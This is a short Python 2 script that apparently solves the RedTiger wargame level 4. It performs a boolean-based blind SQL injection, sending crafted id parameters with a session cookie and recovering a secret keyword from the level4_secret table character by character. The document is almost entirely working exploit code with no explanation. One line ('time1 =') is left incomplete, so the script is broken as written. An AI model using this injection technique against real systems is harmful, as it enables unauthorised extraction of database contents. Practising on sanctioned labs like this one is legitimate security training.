import urllib2
import time
a = b = 1
headers = {'Cookie':'level4login=there_is_no_bug'}
result = ""
time1 = 
while True:
	flag = 0
	for b in range(33,123):
		url = "http://redtiger.labs.overthewire.org/level4.php?id=1%20and%20ascii(substring((select%20concat(keyword)%20FROM%20level4_secret)" + ",%d,1))=%d-- -"%(a,b) 
		req = urllib2.Request(url,"",headers)
		source = urllib2.urlopen(req).read()
		if "1 rows" in source:
			result = result + chr(b)
			print chr(b)
			flag = 1
			break
	a +=1
	if flag ==0:
		break	
print result
